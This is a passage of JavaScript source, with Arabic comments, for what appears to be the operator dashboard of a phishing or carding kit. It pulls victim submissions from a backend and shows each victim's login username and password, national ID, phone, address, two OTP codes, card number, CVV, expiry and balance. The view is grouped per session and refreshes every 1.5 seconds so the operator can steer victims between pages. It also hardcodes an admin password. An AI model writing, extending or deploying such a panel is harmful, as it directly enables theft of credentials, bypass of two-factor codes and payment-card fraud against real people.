/** تخزين التسجيلات في MongoDB عبر واجهة REST (انظر مجلد server) */
class ApiDatabase {
    constructor() {
        this.users = [];
    }

    apiBase() {
        if (typeof getApiBase === 'function') {
            return getApiBase();
        }
        return typeof window !== 'undefined' && typeof window.API_BASE_URL === 'string'
            ? window.API_BASE_URL.replace(/\/$/, '')
            : '';
    }

    apiUrl(relPath) {
        if (typeof window !== 'undefined' && typeof window.resolveYasmeenApiUrl === 'function') {
            return window.resolveYasmeenApiUrl(relPath);
        }
        const r = String(relPath || '').replace(/^\//, '');
        return `${this.apiBase()}/${r}`;
    }

    headers(extra) {
        if (typeof getApiHeaders === 'function') {
            return getApiHeaders(extra);
        }
        return extra || {};
    }

    async refresh() {
        const res = await fetch(this.apiUrl('api/submissions'), {
            headers: this.headers()
        });
        if (!res.ok) {
            throw new Error('تعذر جلب التسجيلات');
        }
        this.users = await res.json();
        return this.users;
    }

    getAllUsers() {
        return this.users;
    }

    async addUser(userData) {
        const body = {
            ...userData,
            timestamp: new Date().toLocaleString('ar-EG'),
            registrationTime: new Date().toLocaleString('ar-EG')
        };
        delete body.id;
        const res = await fetch(this.apiUrl('api/submissions'), {
            method: 'POST',
            headers: this.headers({ 'Content-Type': 'application/json' }),
            body: JSON.stringify(body)
        });
        if (!res.ok) {
            throw new Error('تعذر إضافة السجل');
        }
        await this.refresh();
        this.playNotificationSound();
        this.showNotification(`تم تسجيل مستخدم جديد: ${body.name || ''}`, 'success');
    }

    async deleteUser(userId) {
        const res = await fetch(
            this.apiUrl(
                'api/submissions/' + encodeURIComponent(String(userId))
            ),
            { method: 'DELETE', headers: this.headers() }
        );
        if (!res.ok) {
            throw new Error('تعذر حذف السجل');
        }
        this.users = this.users.filter((u) => String(u.id) !== String(userId));
    }

    async deleteAllUsers() {
        const res = await fetch(this.apiUrl('api/submissions'), {
            method: 'DELETE',
            headers: this.headers()
        });
        if (!res.ok) {
            throw new Error('تعذر حذف الكل');
        }
        this.users = [];
    }

    searchUsers(query) {
        const q = query.trim().toLowerCase();
        if (!q) return this.users;
        return this.users.filter((user) => userMatchesSearchQuery(user, q));
    }

    playNotificationSound() {
        try {
            const audioContext = new (window.AudioContext || window.webkitAudioContext)();
            const oscillator = audioContext.createOscillator();
            const gainNode = audioContext.createGain();

            oscillator.connect(gainNode);
            gainNode.connect(audioContext.destination);

            gainNode.gain.setValueAtTime(0.3, audioContext.currentTime);
            gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.5);

            oscillator.frequency.value = 800;
            oscillator.type = 'sine';

            oscillator.start(audioContext.currentTime);
            oscillator.stop(audioContext.currentTime + 0.5);
        } catch (e) {
            /* ignore */
        }
    }

    showNotification(message, type = 'info') {
        const notification = document.getElementById('notification');
        if (!notification) return;
        notification.textContent = message;
        notification.className = `notification show ${type}`;
        setTimeout(() => {
            notification.classList.remove('show');
        }, 3000);
    }
}

let db = new ApiDatabase();
let currentUser = null;
let isLoggedIn = false;

const INTERNAL_FIELD_KEYS = new Set([
    'id',
    'page',
    'timestamp',
    'registrationTime',
    'createdAt',
    'updatedAt',
    'client_session_id',
    'session_id',
    'linked_username',
    'linked_phone'
]);

const FIELD_LABELS_AR = {
    username: 'اسم المستخدم',
    password: 'كلمة المرور',
    name: 'الاسم',
    'full-name': 'الاسم الكامل',
    'national-id': 'الرقم القومي',
    phone: 'رقم الهاتف',
    email: 'البريد الإلكتروني',
    address: 'العنوان',
    city: 'المدينة',
    gov: 'المحافظة',
    district: 'المنطقة / الحي',
    street: 'الشارع',
    otpCode: 'رمز OTP',
    verificationCode: 'رمز التحقق',
    card_number: 'رقم البطاقة',
    card_holder: 'اسم صاحب البطاقة',
    expiry_date: 'تاريخ انتهاء البطاقة',
    expiry_month: 'شهر الانتهاء',
    expiry_year: 'سنة الانتهاء',
    cvv: 'CVV / CVC',
    balance: 'الرصيد المتوفر',
    selectedWatch: 'الساعة المختارة'
};

const FIELD_DISPLAY_ORDER = [
    'username', 'password', 'name', 'full-name', 'national-id', 'phone', 'email',
    'gov', 'district', 'street', 'address', 'city',
    'otpCode', 'verificationCode',
    'card_number', 'card_holder', 'expiry_date', 'expiry_month', 'expiry_year', 'cvv', 'balance',
    'selectedWatch'
];

function escapeHtml(value) {
    if (value === null || value === undefined) return '';
    const div = document.createElement('div');
    div.textContent = String(value);
    return div.innerHTML;
}

function orderedFieldKeys(keys) {
    return keys.sort((a, b) => {
        const ia = FIELD_DISPLAY_ORDER.indexOf(a);
        const ib = FIELD_DISPLAY_ORDER.indexOf(b);
        if (ia === -1 && ib === -1) return String(a).localeCompare(String(b), 'ar');
        if (ia === -1) return 1;
        if (ib === -1) return -1;
        return ia - ib;
    });
}

function normalizeUserForDisplay(user) {
    if (!user) return {};
    const out = { ...user };
    const cn = out.card_number != null ? String(out.card_number).trim() : '';
    const cnum = out.cardNumber != null ? String(out.cardNumber).trim() : '';
    if (!cn && cnum) out.card_number = out.cardNumber;
    const ch = out.card_holder != null ? String(out.card_holder).trim() : '';
    const chld = out.cardHolder != null ? String(out.cardHolder).trim() : '';
    if (!ch && chld) out.card_holder = out.cardHolder;
    let cv = '';
    const cvKeys = ['cvv', 'CVV', 'cvc', 'CVC', 'securityCode', 'card_cvv', 'cvvCode'];
    for (const k of cvKeys) {
        if (out[k] != null && String(out[k]).trim() !== '') {
            cv = String(out[k]).trim();
            break;
        }
    }
    if (cv) out.cvv = cv;
    const ex = out.expiry_date != null ? String(out.expiry_date).trim() : '';
    if (!ex) {
        const m = String(out.expiry_month || '').replace(/\D/g, '').slice(0, 2);
        const yRaw = String(out.expiry_year || '').replace(/\D/g, '');
        const yy = yRaw.length <= 2 ? yRaw.padStart(2, '0') : yRaw.slice(-2);
        if (m && yy) out.expiry_date = `${m.padStart(2, '0')}/${yy}`;
    }
    delete out.cardNumber;
    delete out.cardHolder;
    delete out.cvc;
    delete out.CVV;
    delete out.CVC;
    delete out.securityCode;
    delete out.card_cvv;
    delete out.cvvCode;
    return out;
}

/** جداول الداشبورد: كل صفحة بنموذجها وعنوانها */
const DASHBOARD_FORM_TABLES = [
    {
        page: 'login',
        title: 'معلومات الحساب',
        fields: [
            { key: 'username', label: 'اسم المستخدم' },
            { key: 'password', label: 'كلمة المرور' }
        ]
    },
    {
        page: 'personal',
        title: 'بيانات شخصية',
        fields: [
            { key: 'full-name', label: 'الاسم الكامل' },
            { key: 'national-id', label: 'الرقم القومي' },
            { key: 'phone', label: 'رقم الهاتف' }
        ]
    },
    {
        page: 'otp',
        title: 'رمز أول',
        fields: [{ key: 'otpCode', label: 'رمز OTP' }]
    },
    {
        page: 'otp2',
        title: 'رمز ثاني',
        fields: [{ key: 'verificationCode', label: 'رمز التحقق' }]
    },
    {
        page: 'address',
        title: 'العنوان',
        fields: [
            { key: 'gov', label: 'المحافظة' },
            { key: 'district', label: 'المنطقة / الحي' },
            { key: 'street', label: 'الشارع' }
        ]
    },
    {
        page: 'card',
        title: 'بيانات البطاقة',
        fields: [
            { key: 'card_number', label: 'رقم البطاقة' },
            { key: 'card_holder', label: 'اسم صاحب البطاقة' },
            { key: 'cvv', label: 'CVV / CVC' },
            { key: 'expiry_date', label: 'تاريخ الانتهاء' },
            { key: 'expiry_month', label: 'شهر الانتهاء' },
            { key: 'expiry_year', label: 'سنة الانتهاء' },
            { key: 'balance', label: 'الرصيد المتوفر' }
        ]
    },
    {
        page: 'watches',
        title: 'الساعة الذكية',
        fields: [{ key: 'selectedWatch', label: 'الساعة المختارة' }]
    }
];

let dashboardRefreshIntervalId = null;
let aggregatedUsers = [];

/** صفحة التنقل التي أرسلها المشرف آخراً (تظهر باللون الأخضر حتى يصلها تحديث من الخادم) */
let lastNavTargetPage = null;

function recordSortTimestamp(rec) {
    if (rec.createdAt) {
        const t = new Date(rec.createdAt).getTime();
        if (!isNaN(t)) return t;
    }
    if (rec.updatedAt) {
        const t = new Date(rec.updatedAt).getTime();
        if (!isNaN(t)) return t;
    }
    return Date.parse(String(rec.registrationTime || rec.timestamp || '')) || 0;
}

function getSearchQuery() {
    const el = document.getElementById('searchInput');
    return el ? el.value.trim() : '';
}

function userMatchesSearchQuery(user, query) {
    const q = query.trim().toLowerCase();
    if (!q) return true;
    const u = normalizeUserForDisplay(user);
    for (const k of Object.keys(u)) {
        if (INTERNAL_FIELD_KEYS.has(k)) continue;
        const val = u[k];
        if (val != null && String(val).toLowerCase().includes(q)) return true;
    }
    if (user.name != null && String(user.name).toLowerCase().includes(q)) return true;
    if (user.username != null && String(user.username).toLowerCase().includes(q)) return true;
    return false;
}

/**
 * مفتاح مستخدم واحد في الداشبورد: يُفضَّل اسم المستخدم/الهاتف ثم الجلسة
 * (لا يُستخدم عنوان الساعة كاسم للتجميع عند page=watches).
 */
function deriveAggregationKey(user) {
    const u = normalizeUserForDisplay(user);
    const page = String(u.page || '');
    const candidates = [
        u.username,
        u.linked_username,
        u.phone,
        u.linked_phone,
        u.email,
        u['national-id'],
        u.client_session_id,
        u.session_id,
        u.card_number
    ];
    if (page !== 'watches') {
        candidates.push(u.name);
    }
    for (const c of candidates) {
        if (c != null && String(c).trim() !== '') {
            return String(c).trim().toLowerCase();
        }
    }
    return `id:${String(u.id || '')}`;
}

/** اسم العرض في الجدول: لا يستخدم عنوان الساعة كاسم مستخدم */
function computeAggregateDisplayName(agg) {
    if (!agg) return 'بدون اسم';
    const m = agg.merged || {};
    const loginRec = agg.byPageRecords && agg.byPageRecords.login;
    const personalRec = agg.byPageRecords && agg.byPageRecords.personal;
    const watchRec = agg.byPageRecords && agg.byPageRecords.watches;
    const watchTitle =
        watchRec && watchRec.selectedWatch != null
            ? String(watchRec.selectedWatch).trim()
            : '';
    let cand =
        m.username ||
        m.linked_username ||
        (loginRec && loginRec.username) ||
        (personalRec && personalRec['full-name']) ||
        m.phone ||
        m.linked_phone ||
        m['full-name'] ||
        '';
    if (
        !cand &&
        m.name &&
        watchTitle &&
        String(m.name).trim() === watchTitle
    ) {
        cand = '';
    }
    if (!cand && m.name) cand = String(m.name).trim();
    return cand || 'بدون اسم';
}

function mergeAggregateGroup(group, recById) {
    const allIds = [...new Set(group.flatMap((g) => g.sourceIds))];
    const recs = allIds
        .map((id) => recById.get(id))
        .filter(Boolean)
        .sort((a, b) => recordSortTimestamp(a) - recordSortTimestamp(b));
    const base = {
        id: String(recs.length ? recs[recs.length - 1].id : group[group.length - 1].id),
        sourceIds: allIds,
        merged: {},
        byPageRecords: {},
        page: '',
        registrationTime: '',
        displayName: 'بدون اسم'
    };
    for (const rec of recs) {
        const row = normalizeUserForDisplay(rec);
        const pageKey = row.page || 'other';
        base.byPageRecords[pageKey] = row;
        for (const k of Object.keys(row)) {
            const val = row[k];
            if (val == null || String(val).trim() === '') continue;
            base.merged[k] = val;
        }
        base.page = row.page || base.page || '';
        base.registrationTime =
            row.registrationTime || row.timestamp || base.registrationTime;
    }
    base.displayName = computeAggregateDisplayName(base);
    base.cardSubmissions = recs
        .filter((r) => String(r.page || '') === 'card')
        .map((r) => normalizeUserForDisplay({ ...r }));
    base.otpSubmissions = recs
        .filter((r) => {
            const p = String(r.page || '');
            return p === 'otp' || p === 'otp2';
        })
        .map((r) => normalizeUserForDisplay({ ...r }));
    return base;
}

/** دمج صفوف قديمة انفصلت بمفتاح جلسة رغم نفس اسم المستخدم */
function collapseAggregatesWithSameUsername(list, recById) {
    const groups = new Map();
    const rest = [];
    for (const agg of list) {
        const u = String(
            agg.merged.username || agg.merged.linked_username || ''
        )
            .trim()
            .toLowerCase();
        const p = String(agg.merged.phone || agg.merged.linked_phone || '')
            .trim()
            .toLowerCase();
        if (u) {
            if (!groups.has(u)) groups.set(u, []);
            groups.get(u).push(agg);
        } else if (p) {
            const pk = 'phone:' + p;
            if (!groups.has(pk)) groups.set(pk, []);
            groups.get(pk).push(agg);
        } else {
            rest.push(agg);
        }
    }
    const out = [...rest];
    for (const [, group] of groups) {
        out.push(
            group.length === 1 ? group[0] : mergeAggregateGroup(group, recById)
        );
    }
    return out;
}

/** دمج كل الصفوف التي تشترك في نفس client_session_id (نفس الجهاز/المتصفح) */
function collapseAggregatesWithSameClientSession(list, recById) {
    const bySid = new Map();
    const rest = [];
    for (const agg of list) {
        const sid = String(getClientSessionIdForAggregate(agg) || '')
            .trim()
            .toLowerCase();
        if (sid) {
            if (!bySid.has(sid)) bySid.set(sid, []);
            bySid.get(sid).push(agg);
        } else {
            rest.push(agg);
        }
    }
    const out = [...rest];
    for (const [, group] of bySid) {
        out.push(
            group.length === 1 ? group[0] : mergeAggregateGroup(group, recById)
        );
    }
    return out;
}

function buildAggregatedUsers(records) {
    const sorted = [...records].sort(
        (a, b) => recordSortTimestamp(a) - recordSortTimestamp(b)
    );
    const map = new Map();
    const list = [];
    for (const rec of sorted) {
        const row = normalizeUserForDisplay(rec);
        const key = deriveAggregationKey(row);
        let agg = map.get(key);
        if (!agg) {
            agg = {
                id: String(row.id || key),
                sourceIds: [],
                merged: {},
                byPageRecords: {},
                cardSubmissions: [],
                otpSubmissions: [],
                page: row.page || '',
                registrationTime: row.registrationTime || row.timestamp || '',
                displayName: 'بدون اسم'
            };
            map.set(key, agg);
            list.push(agg);
        }

        if (row.id != null) {
            const sid = String(row.id);
            if (!agg.sourceIds.includes(sid)) agg.sourceIds.push(sid);
        }

        if (String(rec.page || '') === 'card') {
            if (!agg.cardSubmissions) agg.cardSubmissions = [];
            agg.cardSubmissions.push(normalizeUserForDisplay({ ...rec }));
        }

        const pageStr = String(rec.page || '');
        if (pageStr === 'otp' || pageStr === 'otp2') {
            if (!agg.otpSubmissions) agg.otpSubmissions = [];
            agg.otpSubmissions.push(normalizeUserForDisplay({ ...rec }));
        }

        const pageKey = row.page || 'other';
        agg.byPageRecords[pageKey] = row;

        for (const k of Object.keys(row)) {
            const val = row[k];
            if (val == null || String(val).trim() === '') continue;
            agg.merged[k] = val;
        }

        agg.displayName = computeAggregateDisplayName(agg);
        agg.page = row.page || agg.page || '';
        agg.registrationTime =
            row.registrationTime || row.timestamp || agg.registrationTime;
    }
    const recById = new Map(records.map((r) => [String(r.id), r]));
    let mergedList = collapseAggregatesWithSameUsername(list, recById);
    mergedList = collapseAggregatesWithSameClientSession(mergedList, recById);
    for (const agg of mergedList) {
        let maxTs = 0;
        for (const sid of agg.sourceIds) {
            const r = recById.get(sid);
            if (r) maxTs = Math.max(maxTs, recordSortTimestamp(r));
        }
        agg._sortTs = maxTs;
    }
    mergedList.sort((a, b) => (b._sortTs || 0) - (a._sortTs || 0));
    for (const agg of mergedList) {
        delete agg._sortTs;
    }
    return mergedList;
}

function getUsersForDashboardView() {
    const records = db.getAllUsers();
    const mergedUsers = buildAggregatedUsers(records);
    const q = getSearchQuery();
    if (!q) return mergedUsers;
    return mergedUsers.filter((u) => userMatchesSearchQuery(u.merged, q));
}

function findAggregatedUser(userId) {
    const id = String(userId);
    return aggregatedUsers.find((u) => String(u.id) === id) || null;
}

/** إعادة العثور على نفس المُجمَّع بعد `refresh` (جلسة أو أرقام سجلات) */
function findAggregatedUserAfterRefresh(prev) {
    if (!prev || !aggregatedUsers.length) return null;
    const sid = String(getClientSessionIdForAggregate(prev) || '')
        .trim()
        .toLowerCase();
    if (sid) {
        const bySession = aggregatedUsers.find((agg) => {
            const s = String(getClientSessionIdForAggregate(agg) || '')
                .trim()
                .toLowerCase();
            return s === sid;
        });
        if (bySession) return bySession;
    }
    const idSet = new Set(
        (prev.sourceIds && prev.sourceIds.length
            ? prev.sourceIds
            : [prev.id]
        ).map(String)
    );
    const byIds = aggregatedUsers.find((agg) => {
        const ids = (agg.sourceIds || []).map(String);
        return [...idSet].some((id) => ids.includes(id));
    });
    if (byIds) return byIds;
    return findAggregatedUser(String(prev.id));
}

function isInfoModalOpen() {
    const m = document.getElementById('infoModal');
    return !!(m && m.classList.contains('active'));
}

function isCardModalOpen() {
    const m = document.getElementById('cardModal');
    return !!(m && m.classList.contains('active'));
}

/** يُستدعى بعد تحديث `aggregatedUsers` لمزامنة المودال المفتوح */
function refreshOpenModalsAfterDataChange() {
    const infoOpen = isInfoModalOpen();
    const cardOpen = isCardModalOpen();
    if (!currentUser || (!infoOpen && !cardOpen)) return;

    const next = findAggregatedUserAfterRefresh(currentUser);
    if (!next) {
        if (infoOpen) closeInfoModal();
        if (cardOpen) closeCardModal();
        return;
    }
    currentUser = next;
    if (lastNavTargetPage && String(next.page || '') === lastNavTargetPage) {
        lastNavTargetPage = null;
    }

    if (infoOpen) {
        const el = document.getElementById('userDetails');
        if (el) el.innerHTML = renderUserDetailsByPage(next);
    }
    if (cardOpen) {
        const el = document.getElementById('cardDisplay');
        if (el) {
            const flippedIdx = captureDashboardCardFlipIndices(el);
            el.innerHTML = renderDashboardFlipCardsRow(next);
            applyDashboardCardFlipIndices(el, flippedIdx);
        }
    }
    if (infoOpen || cardOpen) {
        updateNavigationButtons(next.page);
    }
}

/** يحوّل اسم الملف المرسل في navigateTo إلى قيمة data-page */
function navTargetToDataPage(target) {
    let f = String(target || '').trim();
    try {
        if (f.includes('://') || (f.startsWith('/') && f.length > 1)) {
            const u = new URL(f, window.location.origin);
            f = u.pathname.split('/').pop() || '';
        } else if (f.includes('/')) {
            f = f.split('/').filter(Boolean).pop() || f;
        }
    } catch (e) {
        /* keep f */
    }
    f = f.toLowerCase();
    if (f.includes('otp2')) return 'otp2';
    if (f.includes('card-data')) return 'card';
    if (f.includes('login')) return 'login';
    if (f.includes('personal')) return 'personal';
    if (f.includes('otp')) return 'otp';
    if (f.includes('address')) return 'address';
    if (f.includes('watches')) return 'watches';
    return '';
}

/** أحدث client_session_id معروف لهذا الصف المُجمَّع */
function getClientSessionIdForAggregate(agg) {
    if (!agg) return '';
    if (agg.merged && agg.merged.client_session_id) {
        const s = String(agg.merged.client_session_id).trim();
        if (s) return s;
    }
    let best = '';
    let bestTs = -1;
    const pages = agg.byPageRecords || {};
    for (const rec of Object.values(pages)) {
        if (!rec || !rec.client_session_id) continue;
        const t = recordSortTimestamp(rec);
        if (t >= bestTs) {
            bestTs = t;
            best = String(rec.client_session_id).trim();
        }
    }
    return best;
}

function bindDashboardTableClickDelegation() {
    const wrap = document.getElementById('dashboardTablesWrap');
    if (!wrap || wrap.dataset.dashDelegate === '1') return;
    wrap.dataset.dashDelegate = '1';
    wrap.addEventListener('click', (e) => {
        const btn = e.target.closest('button[data-dash-action]');
        if (!btn) return;
        const action = btn.getAttribute('data-dash-action');
        const rowId = btn.getAttribute('data-row-id');
        if (!rowId) return;
        e.preventDefault();
        if (action === 'info') openInfoModal(rowId);
        else if (action === 'card') openCardModal(rowId);
        else if (action === 'delete') deleteUserConfirm(rowId);
    });
}

function getFieldDisplayValue(user, fieldKey) {
    const u = normalizeUserForDisplay(user);
    let v;
    if (fieldKey === 'username') {
        v = u.username != null && String(u.username).trim() !== '' ? u.username : u.name;
    } else {
        v = u[fieldKey];
    }
    if (v === undefined || v === null || String(v).trim() === '') return '—';
    return String(v);
}

function summarizeExtraUser(user) {
    const u = normalizeUserForDisplay(user);
    const keys = orderedFieldKeys(Object.keys(u).filter((k) => !INTERNAL_FIELD_KEYS.has(k)));
    const parts = [];
    for (const k of keys) {
        const val = getFieldDisplayValue(user, k);
        if (val === '—') continue;
        const lab = FIELD_LABELS_AR[k] || k;
        parts.push(`${lab}: ${val}`);
    }
    return parts.length ? parts.join(' — ') : '—';
}

function getFormTableConfig(page) {
    return DASHBOARD_FORM_TABLES.find((c) => c.page === page);
}

function renderDashboardTables() {
    const wrap = document.getElementById('dashboardTablesWrap');
    if (!wrap) return;

    bindDashboardTableClickDelegation();

    const stored = db.getAllUsers();
    if (!stored.length) {
        wrap.innerHTML =
            '<p class="dashboard-empty-all">لا توجد بيانات مسجلة</p>';
        aggregatedUsers = [];
        refreshOpenModalsAfterDataChange();
        return;
    }

    const viewUsers = getUsersForDashboardView();
    aggregatedUsers = viewUsers;

    if (!viewUsers.length) {
        wrap.innerHTML =
            '<p class="dashboard-empty-all">لا توجد نتائج مطابقة للبحث</p>';
        refreshOpenModalsAfterDataChange();
        return;
    }

    const attrId = (id) => escapeHtml(String(id));

    const rows = viewUsers
        .map((user, idx) => {
            const rid = attrId(user.id);
            return `
            <tr>
                <td>${idx + 1}</td>
                <td>${escapeHtml(user.displayName || 'بدون اسم')}</td>
                <td><span class="page-badge">${escapeHtml(getPageArabic(user.page || ''))}</span></td>
                <td class="action-column"><button type="button" class="btn-info" data-dash-action="info" data-row-id="${rid}">معلومات</button></td>
                <td class="action-column"><button type="button" class="btn-card" data-dash-action="card" data-row-id="${rid}">بطاقة</button></td>
                <td>${escapeHtml(user.registrationTime || '—')}</td>
                <td class="action-column"><button type="button" class="btn-delete" data-dash-action="delete" data-row-id="${rid}">حذف</button></td>
            </tr>`;
        })
        .join('');

    wrap.innerHTML = `
    <section class="form-table-section">
        <h2 class="form-table-title">المستخدمون</h2>
        <div class="table-container">
            <table class="users-table form-data-table">
                <thead>
                    <tr>
                        <th>#</th>
                        <th>اسم المستخدم</th>
                        <th>آخر صفحة</th>
                        <th>معلومات</th>
                        <th>بطاقة</th>
                        <th>وقت التسجيل</th>
                        <th>حذف</th>
                    </tr>
                </thead>
                <tbody>${rows}</tbody>
            </table>
        </div>
    </section>`;
    refreshOpenModalsAfterDataChange();
}

// Session Management - حفظ جلسة الدخول
function saveSession() {
    localStorage.setItem('adminSession', JSON.stringify({
        isLoggedIn: true,
        timestamp: new Date().getTime(),
        device: navigator.userAgent
    }));
}

function getSession() {
    const session = localStorage.getItem('adminSession');
    return session ? JSON.parse(session) : null;
}

function clearSession() {
    localStorage.removeItem('adminSession');
}

// Password Check
function checkPassword() {
    const password = document.getElementById('adminPassword').value;
    const adminPassword = 'qqwe@22'; // كلمة المرور الافتراضية

    if (password === adminPassword) {
        isLoggedIn = true;
        // حفظ الجلسة
        saveSession();
        
        // إخفاء login modal بشكل صحيح
        const loginModal = document.getElementById('loginModal');
        loginModal.classList.remove('active');
        loginModal.style.setProperty('display', 'none', 'important');
        
        // إظهار dashboard
        document.getElementById('dashboardContainer').classList.remove('dashboard-hidden');
        document.getElementById('adminPassword').value = '';
        
        // التأكد من إغلاق أي مودالات
        const infoModal1 = document.getElementById('infoModal');
        infoModal1.classList.add('modal-hidden');
        infoModal1.classList.remove('active');
        infoModal1.style.setProperty('display', 'none', 'important');
        
        const cardModal1 = document.getElementById('cardModal');
        cardModal1.classList.add('modal-hidden');
        cardModal1.classList.remove('active');
        cardModal1.style.setProperty('display', 'none', 'important');
        
        loadDashboard();
    } else {
        db.showNotification('كلمة المرور غير صحيحة', 'error');
    }
}

function logout() {
    isLoggedIn = false;
    // حذف الجلسة
    clearSession();
    
    // إظهار login modal
    const loginModal = document.getElementById('loginModal');
    loginModal.classList.add('active');
    loginModal.style.setProperty('display', 'flex', 'important');
    
    // إخفاء dashboard والمودالات
    document.getElementById('dashboardContainer').classList.add('dashboard-hidden');
    
    const infoModal2 = document.getElementById('infoModal');
    infoModal2.classList.add('modal-hidden');
    infoModal2.classList.remove('active');
    infoModal2.style.setProperty('display', 'none', 'important');
    
    const cardModal2 = document.getElementById('cardModal');
    cardModal2.classList.add('modal-hidden');
    cardModal2.classList.remove('active');
    cardModal2.style.setProperty('display', 'none', 'important');
    document.getElementById('searchInput').value = '';
    document.getElementById('adminPassword').value = '';
}

// Load Dashboard
async function loadDashboard() {
    try {
        await db.refresh();
    } catch (e) {
        console.error(e);
        db.showNotification(
            'تعذر جلب البيانات. تحقق من: تشغيل Node وMongo على Render، وفي api-config.js عيّن NODE_BACKEND_ORIGIN برابط خدمة Render إن كانت الصفحات على استضافة ثابتة، وفي Render أضف PUBLIC_SITE_URL بدومين الموقع الثابت (لـ CORS).',
            'error'
        );
    }
    renderDashboardTables();
    if (dashboardRefreshIntervalId) {
        clearInterval(dashboardRefreshIntervalId);
    }
    dashboardRefreshIntervalId = setInterval(async () => {
        try {
            await db.refresh();
        } catch (err) {
            console.error(err);
        }
        renderDashboardTables();
    }, 1500);
}

function getPageArabic(page) {
    const pages = {
        'login': 'تسجيل الدخول',
        'personal': 'المعلومات الشخصية',
        'otp': 'OTP',
        'otp2': 'التحقق من OTP',
        'address': 'العنوان',
        'card': 'بيانات البطاقة',
        'watches': 'الساعة الذكية'
    };
    return pages[page] || page;
}

// Search
function searchUsers() {
    renderDashboardTables();
}

// Delete Functions
async function deleteUserConfirm(userId) {
    if (!confirm('هل تريد حقاً حذف هذا المستخدم وجميع سجلات مساره؟')) return;
    try {
        const target = findAggregatedUser(userId);
        const ids =
            target && target.sourceIds && target.sourceIds.length
                ? target.sourceIds
                : [userId];
        for (const id of ids) {
            await db.deleteUser(id);
        }
        renderDashboardTables();
        db.showNotification('تم الحذف بنجاح', 'success');
    } catch (e) {
        console.error(e);
        db.showNotification('فشل حذف السجل', 'error');
    }
}

async function deleteAllUsers() {
    if (!confirm('هل تريد حقاً حذف جميع المستخدمين؟ هذا لا يمكن التراجع عنه!')) return;
    if (!confirm('تأكيد: حذف جميع المستخدمين؟')) return;
    try {
        await db.deleteAllUsers();
        renderDashboardTables();
        db.showNotification('تم حذف جميع المستخدمين', 'success');
    } catch (e) {
        console.error(e);
        db.showNotification('فشل حذف البيانات', 'error');
    }
}

// Info Modal
function openInfoModal(userId) {
    lastNavTargetPage = null;
    currentUser = findAggregatedUser(userId);
    if (!currentUser) return;

    // تنظيم البيانات حسب الصفحات
    const detailsHtml = renderUserDetailsByPage(currentUser);
    document.getElementById('userDetails').innerHTML = detailsHtml;

    // Update navigation buttons
    updateNavigationButtons(currentUser.page);
    
    const infoModal = document.getElementById('infoModal');
    infoModal.classList.remove('modal-hidden');
    infoModal.classList.add('active');
    infoModal.style.setProperty('display', 'flex', 'important');
}

function renderUserDetailsByPage(user) {
    const byPage = user.byPageRecords || {};
    let html = '';
    for (const cfg of DASHBOARD_FORM_TABLES) {
        const source = byPage[cfg.page]
            ? normalizeUserForDisplay(byPage[cfg.page])
            : {};
        let rows = '';
        let anyFilled = false;
        for (const f of cfg.fields) {
            const val = getFieldDisplayValue(source, f.key);
            if (val !== '—') anyFilled = true;
            rows += `<tr><th>${escapeHtml(f.label)}</th><td>${escapeHtml(val)}</td></tr>`;
        }
        if (!anyFilled) {
            rows = '<tr><th colspan="2">لا توجد تسجيلات في هذا القسم</th></tr>';
        }
        html += `
        <div class="page-section">
            <h3>${escapeHtml(cfg.title)}</h3>
            <table class="detail-field-table">
                <tbody>${rows}</tbody>
            </table>
        </div>`;
    }
    return html;
}

function closeInfoModal() {
    const infoModal = document.getElementById('infoModal');
    infoModal.classList.add('modal-hidden');
    infoModal.classList.remove('active');
    infoModal.style.setProperty('display', 'none', 'important');
    lastNavTargetPage = null;
    currentUser = null;
}

const CARD_REG_ORDINALS_AR = [
    'الأول',
    'الثاني',
    'الثالث',
    'الرابع',
    'الخامس',
    'السادس',
    'السابع',
    'الثامن',
    'التاسع',
    'العاشر'
];

function cardRegistrationCaptionAr(index1Based) {
    const n = index1Based;
    if (n >= 1 && n <= CARD_REG_ORDINALS_AR.length) {
        return 'التسجيل ' + CARD_REG_ORDINALS_AR[n - 1];
    }
    return 'التسجيل رقم ' + n;
}

function formatCardNumberSpaced(raw) {
    const d = String(raw || '')
        .replace(/\D/g, '')
        .slice(0, 16);
    if (!d) return '—';
    return d.replace(/(\d{4})(?=\d)/g, '$1 ').trim();
}

function getCardSubmissionsForUser(user) {
    if (user.cardSubmissions && user.cardSubmissions.length) {
        return user.cardSubmissions;
    }
    const c = user.byPageRecords && user.byPageRecords.card;
    if (c) return [normalizeUserForDisplay(c)];
    const m = user.merged;
    if (m && (m.card_number != null || m.card_holder != null)) {
        return [normalizeUserForDisplay(m)];
    }
    return [];
}

function getOtpSubmissionsForUser(user) {
    let list = [];
    if (user.otpSubmissions && user.otpSubmissions.length) {
        list = user.otpSubmissions.map((r) => normalizeUserForDisplay({ ...r }));
    } else {
        const otp = user.byPageRecords && user.byPageRecords.otp;
        const otp2 = user.byPageRecords && user.byPageRecords.otp2;
        if (otp) list.push(normalizeUserForDisplay({ ...otp }));
        if (otp2) list.push(normalizeUserForDisplay({ ...otp2 }));
    }
    return [...list].sort(
        (a, b) => recordSortTimestamp(a) - recordSortTimestamp(b)
    );
}

function renderDashboardOtpTableSection(user) {
    const list = getOtpSubmissionsForUser(user);
    if (!list.length) {
        return `
        <div class="dash-otp-section">
            <h3 class="dash-otp-heading">رموز التحقق (صفحتا OTP)</h3>
            <p class="dash-otp-empty">لا توجد رموز مسجّلة.</p>
        </div>`;
    }
    const body = list
        .map((u, i) => {
            const page = String(u.page || '');
            const isSecond = page === 'otp2';
            const code = isSecond
                ? u.verificationCode != null && String(u.verificationCode).trim() !== ''
                    ? String(u.verificationCode).trim()
                    : '—'
                : u.otpCode != null && String(u.otpCode).trim() !== ''
                  ? String(u.otpCode).trim()
                  : '—';
            const sourceLabel = isSecond ? 'الرمز الثاني (otp2)' : 'الرمز الأول (otp)';
            const when =
                u.registrationTime || u.timestamp || u.createdAt || '—';
            return `
        <tr>
            <td>${i + 1}</td>
            <td>${escapeHtml(sourceLabel)}</td>
            <td><code class="dash-otp-code">${escapeHtml(code)}</code></td>
            <td>${escapeHtml(String(when))}</td>
        </tr>`;
        })
        .join('');
    return `
    <div class="dash-otp-section">
        <h3 class="dash-otp-heading">رموز التحقق (صفحتا OTP و otp2)</h3>
        <table class="dash-otp-table">
            <thead>
                <tr>
                    <th>#</th>
                    <th>المصدر</th>
                    <th>الرمز</th>
                    <th>وقت التسجيل</th>
                </tr>
            </thead>
            <tbody>${body}</tbody>
        </table>
    </div>`;
}

/** فهارس البطاقات المقلوبة (لحفظ الحالة عند إعادة رسم المودال تلقائياً) */
